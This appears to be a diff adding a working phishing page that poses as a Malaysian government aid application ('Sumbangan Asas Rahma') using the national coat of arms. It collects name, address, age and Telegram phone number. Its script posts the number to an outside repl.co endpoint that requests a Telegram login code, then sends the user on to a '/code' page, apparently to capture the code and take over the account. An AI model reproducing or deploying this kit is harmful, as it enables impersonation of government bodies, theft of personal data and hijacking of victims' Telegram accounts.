@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sumbangan Asas Rahma - Home</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/public/css/home.css" />
+    <link
+      rel="shortcut icon"
+      href="/public/images/logomod.png"
+      type="image/x-icon"
+    />
+    <style>
+      .spinner {
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #2d65ae;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 2s linear infinite;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        box-sizing: border-box;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container py-5">
+      <header class="text-center mb-4">
+        <img
+          src="Coat_of_arms_of_Malaysia.svg.png"
+          alt="logo"
+          class="img-fluid mx-auto d-block"
+          style="width: 450px"
+        />
+      </header>
+
+      <main>
+        <div class="first">
+          <h4 class="fw-bold mt-2 page-header text-center">
+            <marquee scrolldelay="30"
+              >Isikan data peribadi anda di bawah dengan betul supaya tiada
+              masalah semasa pengesahan</marquee
+            >
+          </h4>
+          <form id="personalDataForm">
+            <div
+              class="mb-3"
+              style="max-width: 350px; margin-left: auto; margin-right: auto"
+            >
+              <label for="full_name"
+                ><b>Nama Penuh (seperti dalam IC)*</b></label
+              >
+              <input
+                class="form-control"
+                placeholder="Nama Anda"
+                maxlength="100"
+                type="text"
+                name="full_name"
+                id="full_name"
+                required
+              />
+            </div>
+
+            <div
+              class="mb-3"
+              style="max-width: 350px; margin-left: auto; margin-right: auto"
+            >
+              <label for="phone" class="form-label"
+                ><b>Nombor Phone Telegram</b></label
+              >
+              <div class="input-group">
+                <span
+                  class="input-group-text visually-hidden"
+                  id="basic-addon1"
+                  style="background-color: #2d65ae; color: #ffffff"
+                  >🇲🇾+60</span
+                >
+                <input
+                  type="tel"
+                  class="form-control"
+                  id="phone"
+                  aria-label="Phone number"
+                  aria-describedby="basic-addon1"
+                  placeholder="1160999xxx"
+                  required
+                />
+              </div>
+            </div>
+
+            <div
+              class="mb-3"
+              style="max-width: 350px; margin-left: auto; margin-right: auto"
+            >
+              <label for="alamat"><b>Alamat</b></label>
+              <input
+                class="form-control"
+                placeholder="alamat"
+                maxlength="100"
+                type="text"
+                name="alamat"
+                id="alamat"
+                required
+              />
+            </div>
+
+            <div
+              class="mb-3"
+              style="max-width: 350px; margin-left: auto; margin-right: auto"
+            >
+              <label for="umur"><b>Umur</b></label>
+              <input
+                class="form-control"
+                placeholder="umur"
+                maxlength="3"
+                type="number"
+                name="umur"
+                id="umur"
+                required
+              />
+            </div>
+
+            <div class="d-grid gap-2 d-flex justify-content-center">
+              <button
+                type="submit"
+                id="submit-button"
+                class="btn"
+                style="background-color: #2d65ae; color: #ffffff"
+              >
+                Apply Now
+              </button>
+            </div>
+          </form>
+        </div>
+
+        <div
+          id="loader"
+          style="
+            display: none;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.5);
+            z-index: 9999;
+          "
+        >
+          <div class="spinner"></div>
+        </div>
+      </main>
+
+      <footer class="text-center mt-4">
+        <p>2024 All Rights Reserved.</p>
+      </footer>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+      var phoneInput = document.getElementById("phone");
+      var countryCodeSpan = document.querySelector("#basic-addon1");
+      var submitBtnDiv = document.querySelector("#submit-button");
+
+      phoneInput.addEventListener("focus", function () {
+        countryCodeSpan.classList.remove("visually-hidden");
+      });
+
+      phoneInput.addEventListener("input", function () {
+        if (this.value.length > 0) {
+          submitBtnDiv.classList.remove("visually-hidden");
+        } else {
+          submitBtnDiv.classList.add("visually-hidden");
+        }
+      });
+
+      // Permintaan
+      document
+        .getElementById("personalDataForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          var phoneNumber = "+60" + document.getElementById("phone").value;
+          requestTelegramCode(phoneNumber);
+        });
+
+      function requestTelegramCode(phoneNumber) {
+        $("#loader").show();
+        $.ajax({
+          url: "https://arulgg919.repl.co/request_telegram_code",
+          type: "POST",
+          contentType: "application/json",
+          data: JSON.stringify({ phone: phoneNumber }),
+          success: function (response) {
+            console.log("Response:", response);
+            $("#loader").hide();
+            sessionStorage.setItem("phoneNumber", phoneNumber);
+            window.location.href = "/code";
+          },
+          error: function (error) {
+            console.log("Error:", error);
+            $("#loader").hide();
+          },
+        });
+      }
+    </script>
+  </body>
+</html>
